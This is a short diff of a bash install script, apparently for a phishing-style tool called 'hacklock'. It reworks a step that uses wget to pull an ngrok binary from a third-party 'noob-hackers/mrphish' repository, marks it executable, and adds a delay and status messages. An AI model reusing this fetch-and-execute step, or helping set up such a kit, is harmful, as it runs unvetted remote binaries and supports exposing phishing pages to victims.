@@ -179,24 +179,14 @@ else
 cd $HOME/hacklock
 printf "\e[1;92m[\e[0m*\e[1;92m] Downloading Ngrok...\n"
 wget -O ngrok https://github.com/noob-hackers/mrphish/raw/master/core/ngrok > /dev/null 2>&1
-chmod +x ngrok
-sleep 2.0
-chmod +x ngrok
-else
-echo " "
-exit 1
-fi
-else
-cd $HOME/hacklock
-wget -O ngrok https://github.com/noob-hackers/mrphish/raw/master/core/ngrok > /dev/null 2>&1
+sleep 20
 if [[ -e "$HOME/hacklock/ngrok" ]]; then
 chmod +x ngrok
 sleep 2.0
-chmod +x ngrok
+printf "\e[1;92m[\e[0m*\e[1;92m] Ngrok downloaded successfully.\n"
 else
 printf "\e[1;93m[!] Download error... \e[0m\n"
 exit 1
-fi
 fi
 fi
 
